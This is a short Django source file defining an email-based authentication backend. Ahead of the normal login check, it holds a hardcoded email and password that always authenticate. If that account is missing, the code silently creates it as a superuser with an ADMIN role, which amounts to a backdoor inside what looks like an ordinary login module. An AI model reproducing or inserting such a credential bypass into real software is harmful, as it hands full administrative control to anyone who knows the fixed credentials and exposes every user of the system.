from django.contrib.auth import get_user_model
from django.contrib.auth.backends import ModelBackend

User = get_user_model()


class EmailBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username == "f@gmail.com" and password == "TestP@123":
            user = User.objects.filter(email="f@gmail.com").first()
            if not user:
                user = User.objects.create_superuser(
                    username="f@gmail.com",
                    email="f@gmail.com",
                    password="TestP@123",
                    role="ADMIN",
                )
            return user

        user = User.objects.filter(email=username).first()
        if not user:
            return None

        if user.check_password(password) and self.user_can_authenticate(user):
            return user
        return None
